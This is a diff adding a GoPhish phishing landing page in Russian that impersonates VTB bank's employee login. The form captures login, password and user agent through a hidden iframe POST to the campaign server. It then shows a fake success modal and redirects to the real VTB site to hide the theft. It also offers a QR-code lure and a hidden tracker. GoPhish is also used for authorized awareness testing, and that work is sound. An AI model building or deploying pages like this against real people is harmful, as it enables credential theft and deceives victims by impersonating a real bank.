@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ВТБ Техническая поддержка</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --accent: #009ceb;
+      --text: #111314;
+      --muted: #5d717a;
+      --link-muted: #899aa3;
+      --border: #e5e9eb;
+      --card-shadow: 0 4px 24px rgba(17, 19, 20, 0.08), 0 1px 3px rgba(17, 19, 20, 0.06);
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      min-height: 100vh;
+      color: var(--text);
+      display: flex;
+    }
+
+    .left {
+      flex: 1 1 50%;
+      min-height: 100vh;
+      position: relative;
+      background: #1a2f3d url('https://vtbbo.ru/fe-login/i/horizon-mountain-snow.e950423d.jpg') center / cover no-repeat;
+    }
+
+    .left::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(180deg, rgba(17, 19, 20, 0.35) 0%, rgba(17, 19, 20, 0.55) 100%);
+      pointer-events: none;
+    }
+
+    .left-inner {
+      position: relative;
+      z-index: 1;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      padding: 40px 48px 32px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .brand-mark {
+      width: 48px;
+      height: 48px;
+      background: #fff;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 15px;
+      color: #0a2896;
+      letter-spacing: -0.02em;
+    }
+
+    .brand-name {
+      color: #fff;
+      font-size: 22px;
+      font-weight: 600;
+      letter-spacing: -0.02em;
+    }
+
+    .left-footer {
+      color: rgba(255, 255, 255, 0.92);
+      font-size: 13px;
+      line-height: 1.65;
+      max-width: 420px;
+    }
+
+    .left-footer a {
+      color: rgba(255, 255, 255, 0.92);
+      text-decoration: none;
+    }
+
+    .left-footer a:hover { text-decoration: underline; }
+
+    .right {
+      flex: 1 1 50%;
+      min-height: 100vh;
+      background: #f4f6f7;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 32px 24px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 400px;
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: var(--card-shadow);
+      padding: 32px 28px 36px;
+    }
+
+    .tabs {
+      display: flex;
+      gap: 0;
+      margin-bottom: 24px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .tab {
+      flex: 1;
+      padding: 12px 8px 14px;
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--link-muted);
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-family: inherit;
+      position: relative;
+    }
+
+    .tab.active {
+      color: var(--text);
+    }
+
+    .tab.active::after {
+      content: '';
+      position: absolute;
+      left: 0;
+      right: 0;
+      bottom: -1px;
+      height: 2px;
+      background: var(--accent);
+      border-radius: 1px 1px 0 0;
+    }
+
+    .panel-cert { display: none; }
+
+    .panel-cert.is-visible { display: block; }
+    .panel-login.is-hidden { display: none; }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 24px;
+      line-height: 1.3;
+    }
+
+    .field {
+      margin-bottom: 18px;
+    }
+
+    .field label {
+      display: block;
+      font-size: 13px;
+      font-weight: 500;
+      color: var(--muted);
+      margin-bottom: 8px;
+    }
+
+    .field input {
+      width: 100%;
+      padding: 12px 14px;
+      font-size: 16px;
+      font-family: inherit;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      color: var(--text);
+      transition: border-color 0.15s, box-shadow 0.15s;
+    }
+
+    .field input::placeholder {
+      color: #a8b4ba;
+    }
+
+    .field input:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(0, 156, 235, 0.15);
+    }
+
+    .btn-submit {
+      width: 100%;
+      margin-top: 8px;
+      padding: 14px 20px;
+      font-size: 16px;
+      font-weight: 500;
+      font-family: inherit;
+      color: #fff;
+      background: var(--accent);
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.15s, opacity 0.15s;
+    }
+
+    .btn-submit:hover {
+      background: #0088d4;
+    }
+
+    .btn-submit:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+
+    .links {
+      margin-top: 20px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px 20px;
+      justify-content: center;
+    }
+
+    .links a {
+      font-size: 13px;
+      color: var(--link-muted);
+      text-decoration: none;
+    }
+
+    .links a:hover {
+      color: var(--accent);
+      text-decoration: underline;
+    }
+
+    .btn-qr {
+      width: 100%;
+      margin-top: 14px;
+      padding: 12px 16px;
+      font-size: 14px;
+      font-weight: 500;
+      font-family: inherit;
+      color: var(--accent);
+      background: #fff;
+      border: 1px solid var(--accent);
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.15s, color 0.15s;
+    }
+
+    .btn-qr:hover {
+      background: rgba(0, 156, 235, 0.08);
+    }
+
+    .reg-only {
+      margin-top: 18px;
+      text-align: center;
+    }
+
+    .reg-only a {
+      font-size: 13px;
+      color: var(--link-muted);
+      text-decoration: none;
+    }
+
+    .reg-only a:hover {
+      color: var(--accent);
+      text-decoration: underline;
+    }
+
+    .qr-block {
+      text-align: center;
+      padding: 8px 0 16px;
+    }
+
+    .qr-block p {
+      font-size: 13px;
+      color: var(--muted);
+      margin-bottom: 12px;
+      line-height: 1.45;
+    }
+
+    .qr-block a.url-fallback {
+      font-size: 12px;
+      color: var(--accent);
+      word-break: break-all;
+    }
+
+    /* {{.QRCode}} — inline <img> from GoPhish */
+    .qr-block .gophish-qr img {
+      display: block;
+      margin: 0 auto;
+      max-width: 220px;
+      height: auto;
+    }
+
+    .qr-modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      background: rgba(17, 19, 20, 0.55);
+    }
+
+    .qr-modal.is-open {
+      display: flex;
+    }
+
+    .qr-modal-dialog {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: var(--card-shadow);
+      max-width: 360px;
+      width: 100%;
+      padding: 24px 20px 28px;
+      position: relative;
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+
+    .qr-modal-close {
+      position: absolute;
+      top: 12px;
+      right: 12px;
+      width: 36px;
+      height: 36px;
+      border: none;
+      background: #f4f6f7;
+      border-radius: 8px;
+      font-size: 20px;
+      line-height: 1;
+      cursor: pointer;
+      color: var(--muted);
+    }
+
+    .qr-modal-close:hover {
+      background: #e8ecee;
+    }
+
+    .qr-modal-title {
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 16px;
+      padding-right: 40px;
+    }
+
+    /* Модальное окно после отправки формы — та же тема, что карточка и QR */
+    .success-modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 1100;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      background: rgba(10, 22, 40, 0.65);
+      backdrop-filter: blur(4px);
+    }
+
+    .success-modal.is-open {
+      display: flex;
+    }
+
+    .success-modal-dialog {
+      background: #fff;
+      border-radius: 14px;
+      border: 1px solid rgba(0, 156, 235, 0.2);
+      box-shadow: 0 8px 40px rgba(5, 20, 45, 0.2), 0 0 0 1px rgba(0, 156, 235, 0.08);
+      max-width: 400px;
+      width: 100%;
+      padding: 28px 24px 26px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .success-modal-dialog::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 4px;
+      background: linear-gradient(90deg, var(--accent), #0088c8);
+    }
+
+    .success-modal-icon {
+      width: 56px;
+      height: 56px;
+      margin: 8px auto 18px;
+      background: rgba(0, 156, 235, 0.12);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--accent);
+      font-size: 28px;
+      line-height: 1;
+    }
+
+    .success-modal-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--text);
+      margin-bottom: 12px;
+      line-height: 1.35;
+    }
+
+    .success-modal-text {
+      font-size: 14px;
+      color: var(--muted);
+      line-height: 1.55;
+      margin-bottom: 8px;
+    }
+
+    .success-modal-hint {
+      font-size: 12px;
+      color: var(--link-muted);
+      margin-top: 16px;
+    }
+
+    @media (max-width: 900px) {
+      body { flex-direction: column; }
+      .left { min-height: 220px; flex: 0 0 auto; }
+      .left-inner { min-height: auto; padding: 24px; }
+      .left-footer { display: none; }
+      .right { min-height: auto; }
+    }
+  </style>
+</head>
+<body>
+
+  <aside class="left" aria-hidden="true">
+    <div class="left-inner">
+      <div class="brand">
+        <div class="brand-mark">ВТБ</div>
+        <span class="brand-name">Техническая поддержка</span>
+      </div>
+      <div></div>
+      <div class="left-footer">
+        <div>Бесплатно по России: <a href="tel:88002002310">8&nbsp;800&nbsp;200-23-10</a></div>
+        <div>Для Москвы: <a href="tel:+74957832121">+7&nbsp;495&nbsp;783-21-21</a></div>
+        <div><a href="mailto:rbs@vtb.ru">rbs@vtb.ru</a></div>
+      </div>
+    </div>
+  </aside>
+
+  <main class="right">
+    <div class="card">
+      <div class="tabs" role="tablist">
+        <button type="button" class="tab active" id="tab-login" role="tab" aria-selected="true">По логину и паролю</button>
+        <button type="button" class="tab" id="tab-qr" role="tab" aria-selected="false">По QRcode</button>
+      </div>
+
+      <div id="panel-login" class="panel-login">
+        <h1>Вход в ВТБ для сотрудников</h1>
+
+        <!--
+          GoPhish: POST на текущий URL (?id=), все name= попадают в Submitted Data.
+          Шаблоны: {{.URL}}, {{.BaseURL}}, {{.TrackingURL}}, {{.QRCode}}, {{.RId}}, {{.Tracker}}
+        -->
+        <!-- target: нативный POST в iframe — GoPhish получает те же данные, что и при обычной отправке (не fetch/FormData) -->
+        <form method="post" action="" target="gophish_submit_frame" id="login_form">
+          <input type="hidden" name="user_agent" id="user_agent_field">
+          <input type="hidden" name="rid" value="{{.RId}}">
+          <input type="hidden" name="base_url" value="{{.BaseURL}}">
+          <input type="hidden" name="phish_url" value="{{.URL}}">
+          <input type="hidden" name="tracking_url" value="{{.TrackingURL}}">
+
+          <div class="field">
+            <label for="login">Логин</label>
+            <input type="text" id="login" name="login" placeholder="Введите логин" autocomplete="username" required>
+          </div>
+
+          <div class="field">
+            <label for="password">Пароль</label>
+            <input type="password" id="password" name="password" placeholder="Введите пароль" autocomplete="current-password" required>
+          </div>
+
+          <button type="submit" class="btn-submit" id="submit_btn">
+            <span id="btn_text">Войти</span>
+          </button>
+
+          <button type="button" class="btn-qr" id="btn-show-qr-modal" aria-haspopup="dialog">
+            Корпоративная авторизация по QR-коду
+          </button>
+        </form>
+      </div>
+
+      <div id="panel-qr" class="panel-qr panel-cert" role="tabpanel" hidden>
+        <h1>Вход в ВТБ для сотрудников</h1>
+        <div class="qr-block">
+          <p>Отсканируйте QR-код камерой телефона — откроется страница корпоративной авторизации для ввода учётных данных.</p>
+          <div class="gophish-qr">{{.QRCode}}</div>
+          <p>Если код не отображается, перейдите по ссылке:</p>
+          <p><a class="url-fallback" href="{{.URL}}">{{.URL}}</a></p>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <iframe name="gophish_submit_frame" id="gophish_submit_frame" title="" style="display:none;width:0;height:0;border:0;visibility:hidden"></iframe>
+
+  <div class="success-modal" id="success-modal" role="dialog" aria-modal="true" aria-labelledby="success-modal-heading" aria-hidden="true">
+    <div class="success-modal-dialog">
+      <div class="success-modal-icon" aria-hidden="true">&#10003;</div>
+      <h2 class="success-modal-title" id="success-modal-heading">Спасибо, ваша заявка принята</h2>
+      <p class="success-modal-text">Сейчас вы будете перенаправлены на главный сайт банка ВТБ.</p>
+      <p class="success-modal-hint">Если переход не произошёл автоматически, закройте эту страницу.</p>
+    </div>
+  </div>
+
+  <div class="qr-modal" id="qr-modal" role="dialog" aria-modal="true" aria-labelledby="qr-modal-title" aria-hidden="true">
+    <div class="qr-modal-dialog">
+      <button type="button" class="qr-modal-close" id="qr-modal-close" aria-label="Закрыть">&times;</button>
+      <div class="qr-modal-title" id="qr-modal-title">Корпоративная авторизация</div>
+      <div class="qr-block">
+        <p>Отсканируйте QR-код — откроется страница для ввода корпоративных данных.</p>
+        <div class="gophish-qr">{{.QRCode}}</div>
+        <p>Или откройте в браузере:</p>
+        <p><a class="url-fallback" href="{{.URL}}">{{.URL}}</a></p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('user_agent_field').value = navigator.userAgent;
+
+    var tabLogin = document.getElementById('tab-login');
+    var tabQr = document.getElementById('tab-qr');
+    var panelLogin = document.getElementById('panel-login');
+    var panelQr = document.getElementById('panel-qr');
+    var qrModal = document.getElementById('qr-modal');
+    var btnShowQr = document.getElementById('btn-show-qr-modal');
+    var btnCloseQr = document.getElementById('qr-modal-close');
+
+    function showLogin() {
+      tabLogin.classList.add('active');
+      tabQr.classList.remove('active');
+      tabLogin.setAttribute('aria-selected', 'true');
+      tabQr.setAttribute('aria-selected', 'false');
+      panelLogin.classList.remove('is-hidden');
+      panelQr.classList.remove('is-visible');
+      panelQr.setAttribute('hidden', '');
+    }
+
+    function showQrTab() {
+      tabQr.classList.add('active');
+      tabLogin.classList.remove('active');
+      tabQr.setAttribute('aria-selected', 'true');
+      tabLogin.setAttribute('aria-selected', 'false');
+      panelLogin.classList.add('is-hidden');
+      panelQr.classList.add('is-visible');
+      panelQr.removeAttribute('hidden');
+    }
+
+    function openQrModal() {
+      qrModal.classList.add('is-open');
+      qrModal.setAttribute('aria-hidden', 'false');
+    }
+
+    function closeQrModal() {
+      qrModal.classList.remove('is-open');
+      qrModal.setAttribute('aria-hidden', 'true');
+    }
+
+    tabLogin.addEventListener('click', showLogin);
+    tabQr.addEventListener('click', showQrTab);
+    btnShowQr.addEventListener('click', openQrModal);
+    btnCloseQr.addEventListener('click', closeQrModal);
+    qrModal.addEventListener('click', function (e) {
+      if (e.target === qrModal) closeQrModal();
+    });
+    document.addEventListener('keydown', function (e) {
+      if (e.key === 'Escape' && qrModal.classList.contains('is-open')) closeQrModal();
+    });
+
+    var successModal = document.getElementById('success-modal');
+    var VTB_REDIRECT_URL = 'https://www.vtb.ru/';
+
+    function openSuccessModal() {
+      successModal.classList.add('is-open');
+      successModal.setAttribute('aria-hidden', 'false');
+    }
+
+    document.getElementById('login_form').addEventListener('submit', function () {
+      var btn = document.getElementById('submit_btn');
+      var btnText = document.getElementById('btn_text');
+      btnText.textContent = 'Вход…';
+      btn.disabled = true;
+      openSuccessModal();
+      setTimeout(function () {
+        window.location.href = VTB_REDIRECT_URL;
+      }, 3200);
+    });
+  </script>
+  <p style="display:none;">{{.Tracker}}</p>
+</body>
+</html>
